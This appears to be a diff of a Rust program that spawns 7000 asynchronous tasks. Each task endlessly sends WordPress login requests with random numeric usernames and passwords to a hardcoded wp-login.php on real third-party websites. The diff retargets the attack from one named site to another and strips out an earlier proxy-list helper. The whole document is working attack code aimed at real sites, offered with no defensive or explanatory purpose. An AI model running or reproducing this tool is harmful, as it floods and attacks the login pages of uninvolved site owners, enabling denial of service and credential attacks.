@@ -60,11 +60,9 @@ fn make_html_string<'a>(method_raw: &'a str, path:&'a str, headers_dict_r: HashM
     return res;
 }
 
-async fn make_req(url: String, auth_token: String) {
-    let _ = auth_token;
-    let _ = url;
+async fn make_req() {
     loop {
-        let req_url = Url::parse("https://c3may.edu.vn/ktra/wp-login.php").unwrap();
+        let req_url = Url::parse("https://vatlypt.com/wp-login.php").unwrap();
         let host = req_url.host().unwrap().to_string();
         let port;
         if req_url.port().is_none() {
@@ -109,7 +107,7 @@ async fn make_req(url: String, auth_token: String) {
             };
             let bsx = rng.gen_range(0..99999);
             let bsx2 = rng.gen_range(0..99999);
-            let body_str = format!("log={}&pwd={}&rememberme=forever&wp-submit=Log+In&redirect_to=https%3A%2F%2Fc3may.edu.vn%2Fktra%2Fwp-admin%2F&testcookie=1",
+            let body_str = format!("log={}&pwd={}&wp-submit=Log+In&redirect_to=https%3A%2F%2Fvatlypt.com%2Fwp-admin%2F&testcookie=1",
                                    bsx.to_string(), bsx2.to_string(),);
             let data = make_html_string("post", req_url.path(), headers_dict, body_str.as_bytes());
             let _sended = stream.write(data.as_slice()).await.unwrap();
@@ -173,34 +171,13 @@ pub struct Item {
     pub auth_token: String,
 }
 
-async fn get_proxy() -> Result<Root, &'static str> {
-    let result_rs_raw = reqwest::get("http://localhost:1234/").await;
-    if result_rs_raw.is_err() {
-        return Err("brush");
-    }
-    let result_rs = result_rs_raw.unwrap();
-    let result = result_rs.json::<Root>().await;
-    if result.is_err() {
-        return Err("brush");
-    }
-    Ok(result.unwrap())
-}
 
 #[tokio::main]
 async fn main() {
     let ops: [usize; 7000] = core::array::from_fn(|i| i + 1);
     let mut tasks = Vec::with_capacity(ops.len());
     for _i in ops {
-        tasks.push(tokio::spawn(make_req("lol".to_string(), "lol".to_string())));
-        /* 
-        let out = get_proxy().await;
-        if out.is_err() {
-            break;
-        }
-        for i in out.unwrap().items {
-            tasks.push(tokio::spawn(make_req(i.url, i.auth_token)));
-        }
-        */
+        tasks.push(tokio::spawn(make_req()));
     }
     println!("Spawned");
     for task in tasks {
